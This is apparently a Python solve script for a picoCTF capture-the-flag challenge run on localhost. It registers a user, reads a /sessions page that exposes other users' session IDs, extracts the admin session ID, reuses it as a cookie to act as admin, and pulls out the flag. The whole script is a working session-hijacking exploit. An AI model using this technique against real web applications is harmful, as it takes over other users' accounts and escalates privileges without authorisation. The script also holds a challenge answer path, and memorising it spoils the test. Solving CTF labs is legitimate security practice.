import requests
import time
import re


## Endpoints
BASE_URL = "http://localhost:32792"    ## Chane to the given URL
REGISTER_ENDPOINT = "/register"
LOGIN_ENDPOINT = "/login"
HEALTH_ENDPOINT = "/health"
SESSION_ENDPOINT = "/sessions"

## Variables
user_pswd_field = "test7"
debug = False


def d_print(*args, **kwargs):
    if debug:
        print(*args, **kwargs)


def post_request(endpoint: str, data: dict):
    url = f"{BASE_URL}{endpoint}"
    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
        return response
    except requests.RequestException as e:
        print(f"Request to {url} failed: {e}")
        exit(1)


def get_request(endpoint, cookies=None):
    url = f"{BASE_URL}{endpoint}"
    try:
        response = requests.get(url, cookies=cookies)
        response.raise_for_status()
        return response
    except requests.RequestException as e:
        print(f"Request to {url} failed: {e}")
        exit(1)


def main():
    # Wait for health check to pass
    while True:
        try:
            resp = requests.get(f"{BASE_URL}{HEALTH_ENDPOINT}")
            if resp.status_code == 200:
                break
        except requests.RequestException:
            pass
        time.sleep(0.5)


    d_print("\n=================== REGISTER & LOGIN ===================\n")
    register_data = {"username": user_pswd_field, "password": user_pswd_field, "conf_password": user_pswd_field}
    resp = post_request(REGISTER_ENDPOINT, register_data)

    login_data = {"username": user_pswd_field, "password": user_pswd_field}
    resp = post_request(LOGIN_ENDPOINT, login_data)
    d_print(f"Response status: {resp.status_code}, response headers: {resp.headers}")

    sid = resp.headers['Set-Cookie'].split(";")[0].split('session=')[1]
    d_print(f"Sid: {sid}")
    session_cookie = {'session': sid}
    d_print(f"Session cookie: {session_cookie}")


    d_print("\n=================== SESSION ENDPOINT ===================\n")
    resp = get_request(SESSION_ENDPOINT, cookies=session_cookie)
    html = resp.text
    d_print(f"Resp status: {resp.status_code}\nSession endpoint:\n{html}\n")

    lines = html.split("</p>")
    d_print(f"Result of split on </p>:\n{lines}\n")
    admin_sid = None
    for line in lines:
        if "admin" in line:
            d_print(f"Found line with admin:\n{line}\n")
            match = re.search(r"session:([^,]+)", line)
            if match:
                admin_sid = match.group(1)
                d_print(f"Found admin SID: {admin_sid}")
                break

    if not admin_sid:
        print("Could not find admin SID")
        exit(1)


    d_print("\n=================== ADMIN REVISIT ===================\n")
    admin_cookie = {'session': admin_sid}
    resp = get_request("", cookies=admin_cookie)
    html = resp.text
    d_print(f"Resp status: {resp.status_code}\nSession endpoint:\n{html}\n")
    d_print(f"Page as admin:\n{html}\n")

    flag_match = re.search(r"picoCTF\{[a-zA-Z0-9_]+\}", html)
    if flag_match:
        print(f"Acquired flag:\n{flag_match.group(0)}")
        exit(0)

    print("Unable to acquire flag :( -- something went wrong")


if __name__ == '__main__':
    main()
